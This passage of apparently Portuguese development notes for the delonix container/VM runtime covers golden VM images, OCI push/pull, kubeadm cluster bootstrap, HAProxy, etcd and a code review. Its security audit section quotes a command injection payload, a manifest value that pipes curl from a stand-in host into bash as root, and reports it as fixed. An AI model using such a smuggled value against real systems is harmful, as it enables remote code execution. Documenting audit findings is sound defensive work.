    `virt-customize`, logo o build inteiro) falhar. **Corrigido pela raiz**: o passo passou a só
    correr quando `distro == Distro::Ubuntu` — não é só um workaround para o Rocky, é também mais
    correcto para o Debian (o sysctl `kernel.apparmor_restrict_unprivileged_userns` que este
    perfil existe para contornar é uma patch de kernel exclusiva do Ubuntu 23.10+, nunca existiu
    no Debian; ficava lá antes só por não ter sido revisto, inofensivo porque o Debian tem
    `/etc/apparmor.d/`, mas incorrecto na mesma). Teste de regressão dedicado
    (`rootless_steps_rocky_nunca_escreve_perfil_apparmor`) prova que o Rocky nunca vê o comando.
  - `vm-image.yml` ganhou `rocky_release`, mesmo escopo dos inputs de distro anteriores.
    **Limitação conhecida**: tal como o Debian, o download real do `.qcow2` Rocky não foi
    validado de ponta a ponta neste sandbox (mesma ligação de saída lenta) — verificação SHA256
    coberta por teste unitário com a linha real capturada ao vivo, URL/redirect confirmados com
    `curl -I` contra as 3 versões major.
- **`push`/`pull`**: publicam/obtêm a imagem como artefacto OCI de blob único (config vazio + 1
  layer, padrão ORAS/Helm) via `delonix_image::registry::{push_oci_artifact,pull_oci_artifact}`
  (`crates/delonix-image/src/registry.rs`) — generaliza o `Client`/auth/upload já usado por
  `push_to_registry` (imagens de container), sem duplicar a lógica. **PUBLICADA E VALIDADA
  (2026-07-20) via CI** — `ghcr.io/angolardevops/delonix-vm-k8s:1.34` (678.8 MiB, golden
  optimizada), PÚBLICA, com `delonix vm pull` (sem argumento) a descarregá-la de ponta a ponta.
  **`:1.35` publicada a par (2026-07-23)**, mesmo workflow/repositório — as duas tags coexistem
  (`ghcr.io/angolardevops/delonix-vm-k8s:1.34` e `:1.35`).
  O caminho oficial de publicação é o workflow `.github/workflows/vm-image.yml` (disparo manual,
  `workflow_dispatch`, input `k8s_version`): constrói a golden com o binário do próprio commit
  (`image --vm build --offline`) e publica no ghcr. **Lições da publicação real** (a nota anterior
  dizia "publicada em 2026-07-17" mas o package NÃO existia — nunca chegou ao ghcr): (1) o
  **`virt-customize` FUNCIONA em CI** — o bloqueio de `libguestfs` era só do sandbox local, um
  runner `ubuntu-24.04` limpo constrói a golden sem os workarounds; (2) o push do PRIMEIRO package
  de um nome novo no namespace de um **user** (não org) EXIGE um **PAT classic com
  `write:packages`** (secret `GHCR_TOKEN`) — o `GITHUB_TOKEN` do workflow dá **403 Forbidden** mesmo
  com "Workflow permissions: Read and write", porque não pode CRIAR packages novos de user; (3) o
  primeiro push cria o package **privado** — tornar público é um passo manual na UI depois (tags
  seguintes do mesmo package herdam a visibilidade). **Gap conhecido**: o `pull` NÃO recupera os
  metadados (`ubuntu_release`/`k8s_version` ficam `null` — o artefacto OCI só carrega o blob
  qcow2), por isso um `image vm ls` de uma imagem puxada mostra `-` nessas colunas.
- **`ls-remote`** (v0.11.0) — `delonix vm ls-remote` / `image vm ls-remote` / `image --vm
  ls-remote`, sem argumento lista as tags do repositório OCI oficial (`GET
  /v2/<repo>/tags/list`), com argumento qualquer outro repositório — descobre que versões (k8s)
  estão publicadas ANTES de um `pull`, sem tocar em nada local. Reutiliza inteiramente o `Client`/
  auth de `pull`/`push` (`delonix_image::registry::list_remote_tags`, mesmo fluxo 401→token→retry).
  Os três pontos de entrada convergem em `VmImageCmd::LsRemote`, o mesmo padrão triplo que o
  `pull` já seguia. Só a 1.ª página do registo (sem paginação por `Link`) — irrelevante para o
  punhado de tags de uma golden. Validado ao vivo: mostra `1.34` e `1.35` reais no ghcr.io.
- **Bloqueios de host do `virt-customize` — DESAPARECEM com `--offline`** (diagnosticados a
  fundo em 2026-07-17; só afectam o caminho ONLINE, que precisa de DHCP/DNS no appliance):
  1. **Appliance sem cliente DHCP** → `apt-get install` falha com "Could not resolve host".
     Causa-raiz: o `supermin.d/packages` pede `isc-dhcp-client`, mas o supermin só COPIA do host
     e o pacote não estava instalado; o init do appliance tenta `dhclient` e só cai em `dhcpcd`
     como fallback — que também não está nos `hostfiles`. Fix: `sudo apt install isc-dhcp-client`
     (é o que o supermin espera; não é revertido por updates, ao contrário de editar o
     `hostfiles`, que pertence ao pacote `libguestfs0t64`).
  2. **`passt` não dá lease** → o `dhclient` pendura 300s e o build segue SEM rede. Duas camadas:
     (a) o AppArmor (`/etc/apparmor.d/usr.bin.passt`) nega criar socket/PID em
     `/run/user/1000/libguestfs*/` — confirmado por `dmesg | grep 'apparmor.*DENIED.*passt'`; o
     perfil só permite `owner /tmp/**` e `owner @{HOME}/**`, logo
     `XDG_RUNTIME_DIR=$HOME/.cache/libguestfs-run` contorna-o SEM tocar no host. (b) Mesmo assim
     o passt nunca atribui lease (o libguestfs corre-o com `--address 169.254.2.15`), pelo que
     ainda é preciso tirá-lo do PATH (`sudo mv /usr/bin/passt /usr/bin/passt.off`, com `trap`
     para restaurar SEMPRE) → o libguestfs cai no slirp do qemu, que funciona.
  **Conclusão: usar `--offline` e nada disto é preciso.** O `/usr/lib/guestfs` (symlink para
  `/usr/lib/x86_64-linux-gnu/guestfs`, por faltar `libguestfs-common`) continua a ser preciso
  nesta máquina, nos dois modos.

`delonix vm create` ganhou `--hostname`/`--ssh-key <chave-ou-@ficheiro>`/`--user-data <ficheiro>`
— sem `--seed` explícito, gera um ISO NoCloud (`cloud-localds`) por-instância se qualquer um
destes for dado (função pura `build_user_data`, testável sem `cloud-localds` real). Não confundir
com o `build` acima: aquele corre uma vez por IMAGEM (golden), isto corre uma vez por VM.

**`kind: Vm` — paridade total com o CLI + réplica completa do XML libvirt.** A `VmSpec`
(`cmd/vm.rs`) ganhou (1) o **cloud-init declarativo** `hostname`/`sshKeys`/`userData` que só o
CLI tinha; e (2) — CORRIGINDO um bug latente — o `apply` do manifesto passou a gerar **sempre** o
seed (como o CLI), não só quando há volumes: um `kind: Vm` sem volumes ficava sem datasource →
cloud-init saltava a fase de rede → VM sem IP. Além disso, para expressar no manifesto tudo o que
se faz à mão no XML do libvirt, abordagem **"ambos"**: campos **tipados** (`machine`, `cpuModel`
+ `cpuTopology`, `bootOrder`, `tpm`, `video`, `extraDisks` com target dev auto, `extraNics`
network/bridge/user) renderizados no `delonix_vm::libvirt_domain_xml` (função pura, testada), +
dois **escape-hatches de XML cru**: `libvirtXmlOverlay` (fragmentos `<device>` antes de
`</devices>`) e `libvirtXml` (override TOTAL do `<domain>`, verbatim — o seclabel rootless
continua injetado no boot). Os dois hatches são **UNVALIDATED** — só para manifestos confiáveis
(um fragmento pode nomear caminhos/dispositivos arbitrários do host; alinhado com o risco
"manifesto não-confiável" da auditoria E2E). `VmConfig` deriva `Default` (os literais usam
`..Default::default()`); exemplo completo em `examples/vm.yaml`.

**Consola (`vm console`) volta ao shell do host.** A golden faz autologin no ttyS0 → dentro da
consola `exit`/`logout` só re-disparam o getty (loop). O `cmd_console` imprime agora um aviso
claro (i18n) — *voltar ao host: Ctrl+]* — e corre `virsh console` como FILHO (spawn+wait, não
`exec`) para confirmar "De volta ao host" à saída, nos dois backends. E `vm create` mostra
**progresso por etapa** (`CreateStage` emitido pelo motor via `create_with`; texto/i18n no bin) em
stderr + bloco "Próximos passos", com o output cru de `qemu-img`/`virsh` capturado (`run_quiet`);
stdout continua a ser só o nome da VM (scriptável).

`delonix-cri` (`crates/delonix-cri`) ganhou o seu primeiro `[[bin]]` (`src/bin/delonix-cri.rs`)
— antes só existia como library, chamado por ninguém no workspace. Corre `serve_blocking` num
socket unix (`$DELONIX_CRI_ADDR`, default `/run/delonix-cri.sock`) — é o endpoint que o kubelet
fala via `--container-runtime-endpoint`, substituindo containerd/CRI-O.

## Cluster kubeadm (`delonix cluster apply`)

`delonix cluster apply [-f cloud.yaml]` (`kind: Cluster`) — bootstrap `kubeadm` idempotente sobre
SSH em hosts JÁ VIVOS e alcançáveis (não cria VMs — isso é `delonix vm create`, acima). Módulos:
`cmd/remote.rs` (shell-out a `ssh`/`scp` do sistema, `sudo -n` para os comandos remotos — o
utilizador SSH tem de já ter sudo NOPASSWD), `cmd/k8s_recipes.rs` (catálogo PARTILHADO com
`vmimage::build` — repositório `pkgs.k8s.io`/pacotes/swap/módulos/sysctls — para a imagem
dourada e um host preparado por `cluster apply` ficarem exactamente iguais), `cmd/cluster.rs`
(orquestração: prepara todos os hosts → `kubeadm init` no 1.º control-plane → `kubeadm join` dos
restantes control-planes → `kubeadm join` dos workers → traz o kubeconfig para
`<root>/clusters/<nome>-kubeconfig.yaml`, e copia para `~/.kube/config` se ainda não existir).

**Idempotência sem-estado** (pedido explícito, "parecido ao Terraform mas sem ficheiro de
estado"): cada passo de `k8s_recipes` tem um `check` (comando shell, êxito = já satisfeito) e um
`apply`; `kubeadm init`/`join` verificam `/etc/kubernetes/admin.conf`/`kubelet.conf` no host antes
de agir. Nunca dessincroniza de um `.tfstate` porque não há nenhum.

**Simplificações da v1** (pedido era "hosts arbitrários", escopo já grande sem estas):
- **Etcd externo dedicado (v0.24.0)** — `etcd.mode: "external"` + `etcd.hosts` (manifesto) ou
  `cluster kubeadm --etcd-cluster <N>` (auto-provisiona N VMs extra, mesmo `create_and_wait` das
  outras roles). Delonix gera a sua PRÓPRIA CA + um leaf por membro (reutilizado para TLS de peer
  E client/server — reduz a superfície de PKI de um subsistema novo) + um leaf
  `apiserver-etcd-client`, instala+arranca o `etcd` real (binário oficial `etcd-io/etcd`,
  descarregado e verificado por `SHA256SUMS`, nunca por apt — a versão não é da nossa
  responsabilidade) em TODOS os membros em paralelo (`std::thread::scope` — o bootstrap estático
  precisa de todos os membros iniciais alcançáveis em conjunto, não só mais rápido), espera o
  quórum ficar saudável, e só depois corre `kubeadm init`. Como o `kubeadm init` de flags simples
  não consegue exprimir `ClusterConfiguration.etcd.external`, o caminho externo passa a gerar um
  `--config` YAML (`cmd/kubeadm_config.rs`, `serde_yaml`) — o caminho `stacked` (default) fica
  byte-a-byte inalterado. Quórum: `validate()` exige `etcd.hosts` não vazio e um número ÍMPAR
  (excepto exactamente 1, aceite para dev/teste com aviso alto de "sem HA"). **Achado não
  validado, contornado em vez de assumido**: não se confirmou se o `--upload-certs`/
  `--certificate-key` do kubeadm já redistribui o `apiserver-etcd-client` cert para CADA
  control-plane no caso externo (faz-o para o `stacked`); em vez de depender disso,
  `etcd::push_etcd_client_pki` reenvia `ca.crt`+`apiserver-etcd-client.{crt,key}` a CADA
  control-plane (o do `init` e cada `join --control-plane`) antes do respectivo comando kubeadm —
  a correcção fica independente do comportamento nativo do kubeadm; confirmar isso ao vivo é um
  follow-up, não bloqueia esta versão. CA+certos ficam em `<root>/clusters/<nome>/etcd/` (`0700`
  dir, `0600` ficheiros), a mesma convenção de subdirectório por-cluster que `id_ed25519` já usa.
  **Por fazer (deliberadamente fora desta versão)**: adicionar/remover membros depois do bootstrap,
  rotação de certificados, migrar um cluster `stacked` já vivo para `external`, e `mode: vm`
  (manifesto) auto-provisionar etcd — só o `cluster kubeadm --etcd-cluster` o faz por agora
  (`validate()` recusa `etcd.mode: external` fora de `mode: ssh` de propósito, para não descartar
  `etcd.hosts` em silêncio).
- **Preparação de host paralela entre hosts (v0.23.0)** — cada host é independente (sessão SSH
  própria, sem estado partilhado), corre agora em `std::thread::scope`. `kubeadm init`/`join`
  continuam sequenciais (dependem uns dos outros por desenho — o join precisa do token do init).
  Mudança de comportamento: ao contrário do loop antigo (parava no 1º host mau), agora TODOS os
  hosts são preparados e TODAS as falhas reportadas juntas.
- **HA multi-control-plane exige `spec.controlPlaneEndpoint` explícito** — kubeadm precisa de um
  endpoint estável (LB/VIP) à frente de vários control-planes; com 1 só, usa o IP dele.
- Sem teste end-to-end real nesta sessão — este sandbox não tem hosts SSH remotos. Validado até à
  fronteira real: parsing/validação do manifesto, resolução do `delonix-cri`, geração dos
  comandos `kubeadm init`/`join`, e a tentativa real de SSH falha correctamente e com clareza
  (`No route to host` num IP de teste) — não há mais nada para simular sem máquinas verdadeiras.

### `delonix cluster kubeadm [--name <n>] --control-plane <n> --workers <n>`

Camada por cima de `cluster apply` (pedido original, primeira sessão desta série: "um comando,
do zero a um cluster a funcionar"). Não escreve nem exige um `cloud.yaml` — provisiona as VMs e
constrói o `ClusterSpec` em memória, depois chama a MESMA `apply_one` que `cluster apply` usa
(zero duplicação da lógica kubeadm/SSH/validação de segurança — tudo em `cmd/cluster.rs`,
`ClusterCmd::Kubeadm`/`provision_and_apply`).

Fluxo: **resolve a imagem VM dourada** (`--vm-image` ou a única existente em
`VmImageStore` — erro claro se houver 0 ou mais de 1, nunca escolhe às cegas) → **gera ou
carrega uma chave SSH** (`--ssh-key`, ou `ssh-keygen -t ed25519` não-interactivo em
`<root>/clusters/<nome>/id_ed25519`) → **cria as VMs sequencialmente**
(`<nome>-cp1..N`/`<nome>-w1..M`, via `delonix_vm::create` com a imagem dourada como disco +
`cmd::vm::generate_seed_iso` para o cloud-init por-instância, reaproveitado tal-e-qual de
`delonix vm create --ssh-key`) → **espera cada VM ficar alcançável por SSH**
(`wait_for_vm_ssh_ready`: primeiro o IP via `delonix_vm::status`, depois um `ssh_check` real —
`--boot-timeout`, default 300s) → constrói o `ClusterSpec` (utilizador SSH sempre `delonix`, a
conta que a imagem dourada já cria) → `validate()` + `apply_one()` (mesmas defesas da auditoria
de segurança, herdadas automaticamente).

#### HA multi-control-plane: HAProxy automático (v0.13.0)

Com `--control-plane > 1`, provisiona automaticamente uma VM extra (`<nome>-lb`) a correr
**HAProxy** como load balancer TCP (L4, passthrough — a TLS do apiserver termina sempre no
control-plane real, nunca no LB) à frente da porta 6443 de cada control-plane, e usa o IP dessa
VM como `controlPlaneEndpoint` do `kubeadm init`/`join` — um único comando produz um cluster HA a
funcionar, sem flag nova (dispara sozinho a partir de `--control-plane > 1`). `delonix cluster
apply` continua a aceitar um `controlPlaneEndpoint` externo/manual para quem já tem o seu próprio LB.

Nada mudou a jusante: `kubeadm_init`/`kubeadm_join` já suportavam multi-control-plane
(`--control-plane-endpoint`/`--upload-certs`/`--certificate-key`) desde a v1 original — a única
lacuna era nunca termos nenhum endpoint real a apontar-lhes. Novo módulo `cmd/lb.rs`:
`build_haproxy_cfg` (função pura, testada) gera o `haproxy.cfg`; `ensure_haproxy` instala o
haproxy via apt se preciso, escreve a config (mesmo idioma de `prepare_host` para o
`delonix-cri`: tmpfile local → scp → `mv` privilegiado) e reinicia o serviço — sempre reescreve +
reinicia, idempotente-simples (mesmo compromisso já aceite no resto do `cluster apply`), seguro
em qualquer re-execução porque o HAProxy é um proxy L4 sem estado e a VM do LB já é idempotente
por nome (auto-heal, como qualquer outra VM deste cluster).

**Validado ao vivo (host kaeso-sys-01, 2026-07-24)**: `cluster kubeadm --control-plane 2 --workers
3` provisionou as 5 VMs + a `<nome>-lb` a correr HAProxy de ponta a ponta (`creating VM
ngolacloudlab-lb...` → `configuring HAProxy (192.168.122.26)...` → scp da config OK) — confirma o
caminho todo até ao ponto em que `apply_ssh` começa a preparar os hosts reais. Foi essa mesma
corrida que revelou o gap do `delonix-cri` corrigido a seguir.

#### `delonix-cri`/`delonix-cri.service` em falta fora de um checkout (v0.13.2)

Bug report real (mesma corrida acima): depois do LB configurado, `apply_ssh` falhava logo a
seguir com `não encontrei o binário delonix-cri: usa --cri-bin <caminho>, instala-o ao lado do
delonix, ou corre a partir do checkout do código-fonte` — o utilizador tinha instalado via
`install.sh` **sem** `--with-cri` (o default) e corria `cluster kubeadm` de fora de um checkout do
código-fonte, os dois únicos casos que `resolve_cri_bin` sabia resolver antes desta versão.

**Corrigido**, dois gaps da mesma família:

- `resolve_cri_bin`: quando não encontra o binário localmente, descarrega-o (verificado contra o
  `SHA256SUMS` da própria release, o mesmo não-negociável de qualquer download deste código) do
  release do GitHub que bate com a versão do PRÓPRIO `delonix` a correr — os dois publicam-se
  sempre juntos, na mesma tag. Cache em `<root>/bin/<versão>/delonix-cri`, um download por versão
  instalada. Detecta a variante `-v3` (AVX2/BMI2/FMA) com o mesmo critério do `install.sh`.
- `workspace_dist_file("delonix-cri.service")`: o unit systemd é estático e não depende de
  versão — passou a vir embutido no binário (`include_str!`) e é escrito para a mesma pasta de
  cache na primeira vez que falta, sem precisar de rede nenhuma.

Validado ao vivo com um binário isolado (sem `delonix-cri` ao lado, fora de qualquer checkout,
`DELONIX_ROOT` limpo) contra a v0.13.1 real publicada: descarrega, verifica, cacheia, e o
`cluster apply`/`cluster kubeadm` avançam até à fase real de preparação SSH dos hosts.

#### Progresso ao estilo `kind` (v0.14.0)

Pedido directo do utilizador: o log linha-a-linha (uma `println!` por VM criada, por recipe
aplicada, por host preparado) ficava verboso e pouco elegante num cluster de várias VMs — queria
o mesmo formato do `kind create cluster`. `cmd::kindmode.rs` já tinha exactamente esse mecanismo
(`output::Progress`, o próprio comentário do código já dizia "like kind/spinnies") — um spinner
braille por ETAPA lógica (não por VM/comando), que fecha com `✓`/`✗`. `provision_and_apply` e
`apply_ssh` passaram a usá-lo, cada um com a sua própria instância `Progress` (`apply_ssh` também
é chamado por `cluster apply -f`, que nunca passa por `provision_and_apply`):

```
info Creating cluster "ngolacloudlab" (kubeadm, 1.34)...
 ✓ Provisioning 2 control-plane(s) 📦
 ✓ Provisioning 3 worker(s) 📦
 ✓ Provisioning the HAProxy load balancer ⚖️
 ✓ Preparing 6 host(s) 🔧
 ✓ Bootstrapping control-plane (kubeadm init) 🕹️
 ✓ Joining 1 more control-plane(s) 🎮
 ✓ Joining 3 worker(s) 🚜
 ✓ Fetching kubeconfig 📇
```

Sem TTY (pipe/CI/`2>&1 | tee`), o `Progress` já degradava sozinho para uma linha por etapa SÓ
quando ela fecha (nada durante — é o que um log de CI quer) — validado ao vivo exactamente assim.
`create_and_wait`/`prepare_host`/`kubeadm_init`/`kubeadm_join` perderam os `println!` internos
(o passo exterior é que fala agora); os erros ganharam contexto explícito (`[{label}] {}: {e}`)
para não perder diagnóstico com o log granular removido. `ssh-keygen -q` tira o banner ruidoso da
geração da chave. `fetch_kubeconfig` passou a devolver o `PathBuf` em vez de imprimir por dentro —
as duas linhas finais úteis (`kubeconfig: ...`/`export KUBECONFIG=...`) imprimem-se depois do
último `✓`, fora do bloco de progresso, tal como o `kind` real também deixa um resumo no fim.

#### `--name` opcional + auto-pull de `--vm-image` em falta (v0.12.0)

Dois bugs reais (host kaeso-sys-01): (1) `--name` era obrigatório — sem a mesma analogia do nome
automático angolano (`<rei>-<lugar>-NN`) que containers e `cluster create` (modo kind) já têm;
(2) `--vm-image <v>`/`--k8s-version <v>` sem a imagem local dava sempre erro ("não tem qcow2 em
disco"), mesmo a golden sendo um artefacto OCI publicado precisamente para não precisar de
pull manual — e mesmo quando a imagem ESTAVA local mas só sob o nome de convenção completo
(`delonix-vm-k8s:1.34`), porque `resolve_vm_image` devolvia o valor explícito verbatim sem
verificar essa convenção primeiro.

**Corrigido**:

- `--name` passou a `Option<String>`; sem ele, `random_kubeadm_cluster_name` gera um nome livre
  no mesmo padrão (`super::names::random_name`, extraído do `kindmode::random_cluster_name` para
  ser partilhado pelos dois) — colisão verificada contra os nomes de VM existentes (um cluster
  kubeadm não tem registo próprio, É as suas VMs `<nome>-cp1`/`<nome>-w1`).
- `resolve_vm_image` agora prefere o nome de convenção local (`delonix-vm-k8s:<v>`) quando o
  valor explícito não bate certo com nenhuma imagem local por si só — fecha o caso de uma imagem
  já puxada por `vm pull` (que a guarda sob o nome completo) nunca ser encontrada por um
  `--vm-image` abreviado.
- Quando, mesmo assim, não há imagem local nenhuma, `provision_and_apply` já não desiste — chama
  `vmimage::cmd_pull` contra o repositório oficial (`official_pull_source`, mesma normalização:
  um valor com `/` usa-se tal-e-qual, um valor nu ou `delonix-vm-k8s:<v>` resolve contra
  `ghcr.io/angolardevops/delonix-vm-k8s:<v>`), sob o MESMO nome local que `resolve_vm_image` já
  tinha decidido — a chamada seguinte a `qcow2_path` encontra-a.

Validado ao vivo: `--vm-image 1.34` (já local, sob `delonix-vm-k8s:1.34`) resolve sem tentar
nenhum download; `--vm-image 1.35` (ausente) imprime "a descarregar de
'ghcr.io/angolardevops/delonix-vm-k8s:1.35'..." e inicia o pull real; sem `--name`, gera
`nzinga-cacuaco-19` e prossegue para a geração da chave SSH.

## Auditoria de segurança (skill `delonix-runtime-sec`)

Antes de estender `delonix cluster apply`, foi feita uma auditoria ofensiva dedicada (skill nova
`.claude/skills/delonix-runtime-sec/`, perfil de red-team especializado em runtimes de
containers/VMs) — 3 revisões adversariais em paralelo (injecção de comandos, escalada de
privilégio/fuga de namespace, memory safety + cadeia de fornecimento + path traversal).

**Veredicto da fronteira rootless→root**: sólida, nenhum CRÍTICO/ALTO. Socket de controlo do
holder valida `SO_PEERCRED` correctamente entre user namespaces; `join_netns` só recebe caminhos
gerados server-side (nunca input directo do CLI); mapeamento de uid não permite apontar para uid
0 real do host em nenhum dos 3 caminhos (root real/rootless single-uid/rootless com subuid).

**4 achados CRÍTICOS confirmados e CORRIGIDOS nesta mesma sessão** (todos em código novo desta
sessão, nunca tinham sido revistos adversarialmente):

1. **Injecção de comandos via manifesto `Cluster`** — `controlPlaneEndpoint`/`podSubnet`/
   `serviceSubnet`/`k8sVersion` entravam sem saneamento num `format!` que vira o CORPO de um
   `sudo -n bash -c` remoto (`cmd::cluster::kubeadm_init`/`kubeadm_join`). Um `cloud.yaml` com
   `controlPlaneEndpoint: "10.0.0.10; curl evil|bash; #"` era RCE como root no host de produção.
   **Corrigido**: `cmd::cluster::{valid_endpoint,valid_cidr,valid_version}` — whitelist estrita de
   caracteres, chamada em `validate()` antes de qualquer interpolação. `shell_quote` (`remote.rs`)
   só protege a fronteira ssh→bash-c local — nunca sanitiza o CONTEÚDO do comando; esta era a
   lição a reter (documentada nos comentários das funções `valid_*`).
2. **Mesmo vector via `k8sVersion` em `k8s_recipes::k8s_host_recipes`** (repositório apt,
   corrido em TODOS os hosts, incluindo antes do `kubeadm init`) — **corrigido** com a mesma
   validação, reaproveitada também em `vmimage::cmd_build` (`--k8s-version` tem o mesmo caminho).
3. **`pull_oci_artifact` não verificava o digest do blob recebido** contra o manifesto — um
   registo `ghcr.io` comprometido podia servir uma imagem VM dourada adulterada sem detecção.
   **Corrigido**: verificação `sha256(bytes) == digest_esperado` antes de devolver, mesmo padrão
   já usado por `pull_from_registry_with_creds` (que já estava correcto).
4. **Path traversal em `COPY` do `delonix build`** — `src`/`dst` de um Dockerfile/Delonixfile não
   eram confinados ao contexto/rootfs (`..` não neutralizado). **Corrigido**: `cmd::build::
   safe_join` (mesmo padrão de `safe_rel` em `delonix-image::overlay`), rejeita qualquer
   componente `..`/absoluto fora da base.

**2 achados BAIXOS, defesa em profundidade, também corrigidos**: `--` antes de `user@host` nos
argv de `ssh`/`scp` (`remote.rs`); `VmImageStore::base_cache_path` passou a usar `sanitize()`
como os outros métodos do store (`vmimage.rs`).

Todos os 4 CRÍTICOS têm teste automatizado a replicar o exploit e confirmar a rejeição (`cargo
test -p delonix-runtime-bin`/`-p delonix-image`) — ver `cmd::cluster::tests::
validate_recusa_endpoint_malicioso_no_manifesto_completo`,
`registry::tests::pull_oci_artifact_recusa_blob_adulterado`,
`cmd::build::tests::safe_join_recusa_dot_dot`.

## Revisão ampla de código/arquitectura (2026-07-27) — bugs reais corrigidos + dívida documentada

Pedido explícito do utilizador antes da publicação pública: revisão de código E arquitectura
(não só segurança) sobre TODO o repositório, com foco redobrado no código mais recente (dash/
métricas, `compose.rs`, a reorganização da CLI). 4 auditorias em paralelo — resumo em
`docs/COMPARACAO-DOCKER-PODMAN.md` não se aplica aqui (é específico do gap Docker/Podman); os
achados de arquitectura ficam registados nesta secção.

**7 bugs reais confirmados e CORRIGIDOS**:

1. **`compose.rs`: `depends_on: condition: service_completed_successfully` sem timeout** —
   `wait_for_condition` era um `loop {}` sem saída a não ser Ctrl-C se a dependência nunca saísse
   do estado Running (ex.: condição errada num serviço de longa duração, ou `restart:always` a
   reciclar de volta para Running). Corrigido com um tecto generoso (30 min) + heartbeat de
   progresso a cada 30s — nunca mais silenciosamente indistinguível de um hang.
2. **`compose.rs`: porta `host_ip:host:container` (ex.: `127.0.0.1:9000:80`) descartava o IP em
   silêncio** — caía no caminho de 2 partes (`hostPort:containerPort`), publicando em TODAS as
   interfaces exactamente o oposto do que o ficheiro compose pedia (bind só a loopback). Corrigido
   para recusar explicitamente (o motor em si já recusa `-p 127.0.0.1:...` — `parse_publish` exige
   host_port só dígitos), consistente com a regra do próprio módulo de nunca degradar em silêncio.
3. **`compose.rs`: nomes `<projecto>_<chave>` de rede/volume podiam colidir entre projectos
   diferentes** — `format!("{project}_{key}")` não é livre de colisão (`project="a_b" key="c"` e
   `project="a" key="b_c"` davam ambos `"a_b_c"`); redes/volumes não têm campo de labels, por isso
   `compose down` recomputa o nome do zero — uma colisão fazia `down` de um projecto apagar o
   recurso de OUTRO. Corrigido com uma codificação livre de prefixo (`compose_scoped_name`: cada
   `_` literal em projecto/chave duplica-se antes da junção).
4. **`compose.rs`: `shlex_split` escapava backslash a mais dentro de aspas duplas** — POSIX só dá
   significado especial a backslash antes de cifrão, crase, aspas duplas, o próprio backslash, ou
   newline, dentro de `"…"`; qualquer outro carácter mantém o backslash. O parser tratava todos os
   backslashes da mesma forma, mudando em silêncio o argv de um comando com um padrão tipo
   `"grep \d+ ficheiro"`. Corrigido para seguir a regra POSIX exacta dentro de aspas duplas (fora
   delas, o comportamento — escapar o que vier a seguir, incondicionalmente — mantém-se).
5. **`firewall.rs`: TODOS os caminhos de mutação contornavam o `flock` do `Store`** — `ingress
   allow/deny/rm/clear`, `egress` equivalentes, `apply_container_ingress`, e o apply de manifesto
   faziam `store.load` → mutar em memória → `infra::apply_firewall` (kernel) → `store.save`, SEM
   nunca passar por `Store::update` (cujo próprio doc-comment diz que existe precisamente para
   sequenciar este read-modify-write entre processos). Corrida real: dois comandos de firewall
   contra o mesmo container (ou um comando de firewall a competir com uma reconciliação
   concorrente) aplicavam ambos no kernel com sucesso, mas só o último `save` sobrevivia no disco
   — a regra "perdedora" ficava viva no `nft` mas ausente do registo persistido, e desaparecia
   silenciosamente no próximo `container start` (que só reaplica o que está persistido). Corrigido
   com um novo `update_locked` (helper local que envolve `Store::update` para um closure que pode
   ele próprio falhar) — todos os 6 pontos de mutação agora passam pelo `flock`. Validado ao vivo
   (allow→deny→rm→policy→clear, ponta-a-ponta, estado persistido confere com o `nft` real).
6. **`peer_uid()` (extracção `SO_PEERCRED`) duplicado verbatim em 4 sítios** — `delonix-cri`,
   `delonix-mgmt`, `delonix-net::infra`, `cmd/dockerapi.rs`, os quatro já dependem de
   `delonix-runtime-core`, sem razão de fronteira de crate para a duplicação (ao contrário do
   `dir_size`, que genuinamente não pode ser partilhado sem dependência circular). Consolidado em
   `delonix_runtime_core::peer_cred::peer_uid` — um só sítio a partir de agora.
7. **Dashboard/métricas: nenhum timeout na colheita cara (rede+disco), e o total de tráfego
   contava silenciosamente um container `--net host/none` como "0 bytes"** — ver a secção "KPIs de
   recursos" acima para o detalhe completo dos dois achados e das correcções (`collect_with_timeout`
   com tecto de 120s + leak deliberado da thread presa em vez de um hang permanente; novo campo
   `network_unmeasured_containers` exposto no tile/JSON/gauge Prometheus em vez de somado como zero).

**3 achados de arquitectura documentados como dívida conhecida na revisão original — 2 FECHADOS
em 2026-07-27, 1 ainda aberto**:

- ✅ **FEITO — criação de rede já tem rollback em falha parcial.** `create_network` (bridge) fazia
  `store.create(name)?` (declarativo) e só DEPOIS `infra::network_create_with(...)?` (físico); se o
  segundo falhasse, o registo do primeiro ficava órfão — `network ls` mostrava a rede, nada
  conseguia anexar-se (`NotFound`), e um retry de `create` falhava com "already exists" até um
  `network rm` manual. Corrigido: se `network_create_with` falhar, o registo recém-criado é removido
  (`store.remove(name)`) antes de propagar o erro — uma `create` falhada não deixa nada para trás.
  Validado ao vivo o caminho feliz (inalterado); o caminho de falha não foi disparado ao vivo (exige
  forçar `infra::network_create_with` a falhar num host real), mas a lógica é uma reversão pura de
  store, sem risco de fronteira de privilégio. **`overlay` continua com a mesma limitação
  pré-existente** (a mensagem promete "reconcilia no próximo `network create`", mas
  `NetworkStore::create_overlay` não é idempotente) — fora do âmbito desta correcção, que só cobriu
  `bridge`.
- ✅ **FEITO — `JsonStore<T>` ganhou um `update` genérico, mesmo padrão do `Store<Container>`.**
  Novo `JsonStore::update` (lock por `flock`, re-lê sob o lock, aplica `f`, grava) — mesma forma de
  `Store::update`, generalizada por `T: Serialize + DeserializeOwned`. `delonix_vm::status()`
  (que fazia `load`→mutar(IP)→`save` sem lock nenhum, a correr concorrentemente com o refresh de
  métricas em background do dash/`delonix-mgmt` a par de `vm start/stop/create` da CLI) passou a
  usar `st.update(name, |vm| {...})` — a consulta ao backend (`is_running`/`ip`) e a decisão
  correm todas dentro da secção crítica. Teste de regressão puro por concorrência real
  (`jsonstore_update_concorrente_nao_perde_escritas`, mesmo padrão de threads +
  `sleep` a meio da janela de corrida que `update_concorrente_nao_perde_escritas` já usava para o
  `Store<Container>` irmão) — sem lock perderia escritas, com lock as 24 tiveram de bater certo.
  Validado ao vivo: `vm ls` (que chama `status()` para cada VM) continua a funcionar identicamente.
- **`spawn()` (`crates/delonix-runtime/src/lib.rs`) é uma função de ~405 linhas** — ainda aberto,
  cobrindo
  preparação de hostname/argv, setup de pty/socketpair, cálculo de flags de clone, o próprio
  `clone()`, um handshake de userns cuja correcção depende de uma ordem só documentada em
  comentários ("CRITICAL ORDER"), fork+detach do log shim, o hook de rede, setup de cgroup e
  `Store::save` — tudo numa função só. O tratamento de erros interno é cuidadoso, mas o tamanho é
  um risco real de manutenção (uma futura edição que reordene dois blocos pode reintroduzir um
  deadlock/corrida que os próprios comentários já documentam ter existido). Não é um bug ao vivo —
  é uma nota para quem for mexer ali a seguir.

